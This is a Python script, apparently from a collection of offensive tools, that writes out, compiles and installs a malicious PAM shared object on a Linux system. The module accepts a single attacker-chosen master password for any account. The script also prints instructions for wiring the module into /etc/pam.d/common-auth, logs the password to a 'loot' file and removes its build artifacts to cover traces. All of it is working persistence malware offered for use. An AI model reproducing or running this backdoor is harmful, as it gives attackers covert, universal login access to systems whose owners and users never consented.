import os
import sys
import subprocess
import shutil

def deploy_pam_backdoor(master_password):
    """
    Weaponized PAM Hook: Compiles and installs a malicious shared object 
    to provide a universal 'Master Password' bypass.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: PAM modification requires UID 0.")
        sys.exit(1)

    print(f"[*] Preparing PAM Backdoor with Master Key: {master_password}")
    
    # C Source for the malicious PAM module
    pam_src = f"""
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    const char *password;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS) return PAM_AUTH_ERR;
    if (strcmp(password, "{master_password}") == 0) return PAM_SUCCESS;
    return PAM_AUTH_ERR;
}}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {{
    return PAM_SUCCESS;
}}
"""
    
    src_file = "chimera_pam.c"
    obj_file = "pam_chimera.so"
    
    with open(src_file, "w") as f:
        f.write(pam_src)

    print("[*] Compiling PAM Shared Object...")
    try:
        # Compile as a shared library
        subprocess.run(["gcc", "-fPIC", "-shared", "-o", obj_file, src_file], check=True)
        
        # Determine the target directory (distro dependent)
        target_dir = "/lib/x86_64-linux-gnu/security/"
        if not os.path.exists(target_dir):
            target_dir = "/lib/security/"

        final_path = os.path.join(target_dir, obj_file)
        
        # Deploy
        shutil.copy(obj_file, final_path)
        os.chmod(final_path, 0o644)
        
        print(f"[!!!] SUCCESS: Backdoor deployed to {final_path}")
        print("[*] Tactical Note: Add 'auth sufficient pam_chimera.so' to /etc/pam.d/common-auth")
        
        # Log to loot (up three levels from agents/146/src/)
        loot_path = "../../../loot/persistence_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: PAM | Master: {master_password} | Path: {final_path}\n")

    except Exception as e:
        print(f"[-] Compilation/Deployment Fault: {e}")
    finally:
        # Cleanup artifacts
        if os.path.exists(src_file): os.remove(src_file)
        if os.path.exists(obj_file): os.remove(obj_file)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 146_pam_backdoor <master_password>")
        sys.exit(1)
    
    deploy_pam_backdoor(sys.argv[1])
